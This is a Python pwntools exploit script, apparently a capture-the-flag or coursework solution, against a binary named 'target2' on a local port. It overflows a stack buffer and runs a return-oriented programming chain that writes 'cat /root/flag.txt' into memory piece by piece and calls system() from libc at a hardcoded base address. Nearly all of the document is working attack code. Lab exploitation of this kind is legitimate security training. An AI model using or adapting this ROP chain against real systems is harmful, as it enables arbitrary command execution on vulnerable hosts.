from pwn import *  #The pwm module is imported

#The target2 program is assigned to the variable TARGET
#The offset value is called by the cyclic_find function and assigned to the variable offset.
TARGET = "./target2" 
OFFSET = cyclic_find(0x64616174)

#function sends the cyclic value 
def send_cyclic(p):
    p.writeline(cyclic(500))
    
# This function forces the offset 
def force_offset(p):
    payload = cyclic(500)
    p.sendline(payload)
    
#This function checks the offset by making sure we have control of the Intruction Pointer.
def check_offset(p, OFFSET):
    payload = b"A"*OFFSET
    payload += b"BBBB"
    p.sendline(payload)  
    

#libcElF = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#The purporse of this function is to create a payload to uplaod to a website and get the flag.
def win(p, OFFSET):
    theELF = ELF(TARGET)#Target is called by the elf function and assigned to theELF function.
    libcELF = ELF("libc")# The libc library.
    #libcELF = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    #libcELF.address = 0x7f6d7cc37000
    libcELF.address = 0x7f0db1b2e000 #The libc base address retrieved from the proc.
    
    #setuid_offset = 0xd4b00
    SUID = libcELF.sym["setuid"]# calls setuid address from the libc library.
    log.info("SUID %s", hex(SUID))
    
    #system_offset = 0x4c920
    SYSTEM = libcELF.sym["system"] #calls the system address from the libc library.
    log.info("SYSTEM %s", hex(SYSTEM))

    EXIT = libcELF.sym['exit'] #calls the address of exit from the libc library.
    log.info("EXIT %s", hex(EXIT))

    theRop = ROP(TARGET)#The ROP function calls the rop gadgets of the target.
    
    #The pop rdi gadget is called here.
    POP_RDI = theRop.find_gadget(["pop rdi", "ret"])[0]
    log.info("POP RDI %s", hex(POP_RDI))
    
    #The pop rax gadget is called here.
    POP_RAX = theRop.find_gadget(["pop rax", "ret"])[0]
    log.info("POP RAX %s", hex(POP_RDI))
    
    #the pop r13 gadget is called here.
    POP_R13 = theRop.find_gadget(["pop r13", "ret"])[0]
    
    #The return gadget is called here.
    RET = theRop.find_gadget(["ret"])[0]
    log.info("POP RDI %s", hex(RET))
    
    
    #0x000000000040120f: mov qword ptr [rax], r13; ret; 
    
    MOV_QWORD = 0x40120f # The mov gadget address.
    
    MOV_ADDR = 0x00404010 # The base moving base address of the targe.

    
    #MEM_ADD = 0x00404000
   
    #0x000000000040120f: mov qword ptr [rax], r13; ret; 
 
    #This is the contuction of the ROP.
    #I divided the command cat /root/flag.txt into 8 bits chunck and pushed them into the relevant moving gadget and moving base address range 
   
    payload = b"A" * OFFSET
    payload += p64(POP_R13)
    string = b"cat /roo"
    payload += string
    payload += p64(POP_RAX)
    payload += p64(MOV_ADDR)
    payload += p64(MOV_QWORD)
   
    payload += p64(POP_R13)
    string = b"t/flag.t"
    payload += string
    payload += p64(POP_RAX)
    payload += p64(MOV_ADDR + 8)
    payload += p64(MOV_QWORD)
    
    payload += p64(POP_R13)
    string = b"xt\x00\x00\x00\x00\x00\x00" #The \x00 is used to fill up the missing 6 bits to make sure the string is exactly 8 bits
    payload += string
    payload += p64(POP_RAX)
    payload += p64(MOV_ADDR + 16)
    payload += p64(MOV_QWORD)
  
    #Once the string has been correctly pushed the system is then called, which will allow us to execute the cat /root/flag.txt command.
    payload += p64(POP_RDI)
    payload += p64(MOV_ADDR)
    payload += p64(SYSTEM)
    payload += p64(EXIT)
    
    #A payload is created by creating and writing its contents to a malicious file.
    with open ('evilload6', 'wb') as f:
         f.write(payload)
    
    
    p.sendline(payload)#sends a string followed by a newline character over a socket connection.
    
    
# The functions are called here to be executed    
if __name__ == "__main__":
    #The target2 program is assigned to the variable TARGET.
    #The offset value is called by the cyclic_find function and assigned to the variable offset. 
    #0x64616174
    OFFSET = cyclic_find(0x64616174)
    log.info("Cyclic offset is %s", OFFSET)
    
    #The script is ran remotely to execute the target program.
    p = process(TARGET)
    
    p = remote("127.0.0.1",1337) # The script is ran remotely 
   
    p.readline()
    
    pause()
    
    
    #send_cyclic(p)
    
    #force_offset(p)
    
    #check_offset(p, OFFSET)
    
   
    win(p, OFFSET) 
 
    #Allows us to interact with the script.
    p.interactive()
